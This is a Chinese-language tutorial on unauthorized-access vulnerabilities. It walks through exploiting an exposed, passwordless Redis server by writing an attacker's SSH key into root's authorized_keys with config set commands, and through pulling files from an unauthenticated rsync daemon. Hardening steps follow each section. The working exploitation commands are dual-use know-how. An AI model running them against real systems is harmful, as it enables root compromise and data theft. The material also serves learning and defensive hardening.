# 未授权访问漏洞整理

未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。

目前主要存在未授权访问漏洞的有：NFS服务，Samba服务，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，Redis，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo等。

## redis未授权访问漏洞

- 什么是redis未授权访问漏洞：
Redis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。

目前比较主流的案例：yam2 minerd 挖矿程序。

简单说，漏洞的产生条件有以下两点：

1. redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；
2. 没有设置密码认证（一般为空），可以免密码远程登录redis服务。

- 漏洞的危害：

1. 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；
2. 攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；
3. 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器

- 漏洞的复现和利用：

可以反弹shell，写入shell文件，和连接SSH服务

- 连接SSH服务

```linux
https://github.com/Medicean/VulApps/tree/master/r/redis/1   # docker地址

Nmap -A -p 6379 -script redis-info 192.168.22.130           # 扫描redis服务

./redis-cli -h 192.168.22.130                               # 连接redis
info                    # 查看redis信息
ssh-keygen -t rsa       # 生成key
    id_rsa.pub          # 公钥
    id_rsa              # 私钥

将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合）,再把key.txt文件内容写入目标主机的缓冲里：
(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt
crackit 是设置的 key，可随意指定
cat key.txt | redis-3.2.0/src/redis-cli -h 192.168.22.130 -p 6379 -x set crackit

连接redis进行的操作
redis-cli -h 192.168.1.100 -p 6379
config set dir /root/.ssh/
config get dir
config set dbfilename "authorized_keys"

我的ssh端口是22222
ssh -p 22222 root@192.168.22.130 -i ~/.ssh/id_rsa       # 连接成功
```

## 修复与加固

```liux
1、默认只对本地开放     bind 127.0.0.1
2、添加登陆密码         requirepass www.secpulse.com
3、在需要对外开放的时候修改默认端口     port 2333
4、最后还可以配合iptables限制开放
```

## rsync未授权访问漏洞

rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，就可以读写目标服务器文件。

rsync默认配置文件为/etc/rsyncd.conf，常驻模式启动命令rsync –daemon，启动成功后默认监听于TCP端口873，可通过rsync-daemon及ssh两种方式进行认证。

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：Rsync 全版本。

## 其实主要知道几条命令

```linux
rsync IP::   //这是在默认条件下没有改变默认的端口，默认密码是::
rsync --port=xxx ip::  //如果修改了默认端口就需要指定端口，这里就是需要自己指定47900端口
rsync -avz ip::www /tmp   //-avz是下载文件的命令，前一个是目标内容，后一个是自己指定存储在本地的路径
rsync -avz --port=xxx ip::dddd /tmp
```

## 修复与加固

```liux
1、禁止外网访问 rsync服务；
2、rsync服务添加认证功能；
3、以低权限运行 rsync 服务；
6、设置防火墙策略；
```


